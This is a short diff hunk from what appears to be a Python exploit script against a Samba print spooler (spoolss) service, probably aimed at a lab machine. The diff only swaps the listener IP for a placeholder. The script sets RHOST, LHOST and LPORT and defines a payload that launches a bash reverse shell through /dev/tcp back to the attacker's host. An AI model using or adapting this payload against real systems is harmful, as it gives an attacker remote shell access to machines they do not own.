@@ -128,7 +128,7 @@ from samba.dcerpc import spoolss
 from samba.param import LoadParm
 from samba.credentials import Credentials
 
-RHOST, LHOST, LPORT = "10.129.244.177", "10.10.14.100", 4444
+RHOST, LHOST, LPORT = "10.129.244.177", "[IP]", 4444
 
 DATA = (f"setsid bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1' &gt;/dev/null 2>&amp;1 &amp;\n").encode()
 
